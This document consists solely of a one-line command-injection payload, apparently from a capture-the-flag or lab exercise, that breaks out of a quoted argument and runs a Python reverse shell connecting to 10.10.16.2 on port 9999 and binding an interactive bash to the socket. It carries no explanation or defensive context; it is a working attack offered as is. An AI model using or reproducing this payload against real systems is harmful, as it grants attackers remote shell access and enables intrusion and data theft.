a';python3 -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.10.16.2",9999));f=s.fileno;c(["/bin/bash","-i"],stdin=f(),stdout=f(),stderr=f())';#
